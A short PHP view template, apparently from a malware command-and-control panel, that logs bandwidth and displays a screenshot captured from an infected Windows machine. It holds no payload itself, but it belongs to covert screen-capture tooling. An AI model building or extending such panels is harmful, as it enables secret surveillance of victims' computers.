<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot\Screenshot $attack */

$attack->usage()->addBandwidth(filesize($attack->getScreenPath()))->saveState();
$attack->reportDynamicUsage();

?>

<p>This attack is executed. Here is the screenshot:</p>
<div>
    <img src="<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/getFile?file=screen.png"; ?>" width=100% alt="screenshot">
</div>
